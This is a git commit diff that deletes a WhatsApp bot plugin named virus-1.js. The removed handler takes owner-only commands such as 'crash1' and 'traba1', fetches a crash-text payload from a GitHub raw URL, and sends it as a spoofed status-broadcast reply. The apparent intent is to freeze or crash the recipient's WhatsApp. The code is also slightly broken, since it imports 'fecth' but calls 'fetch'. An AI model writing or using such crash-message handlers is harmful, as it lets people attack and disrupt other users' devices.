732aba553d0490a738f0f9b477d9c1f6125de386
DIEGO-OFC <107585310+DIEGO-OFC@users.noreply.github.com>
2022-10-26 21:07:10 -0400

    Delete plugins directory

--- plugins/virus-1.js
+++
@@ -1,8 +0,0 @@
-import fecth from 'node-fetch'
-let handler  = async (m, { conn }) => {
-let info = await fetch('https://raw.githubusercontent.com/DIEGO-OFC/DORRAT-BOT-MD/master/galeria/crash/traba5.txt').then(v => v.text());
-conn.fakeReply(m.chat, info, '0@s.whatsapp.net', '🔥 *by ĐłɆ₲Ø-Ø₣₵ 🔥', 'status@broadcast')}
-handler.command = ['virus1', 'c1', 'binario1', 'traba1', 'crash1'] 
-handler.rowner = true
-handler.fail = null
-export default handler
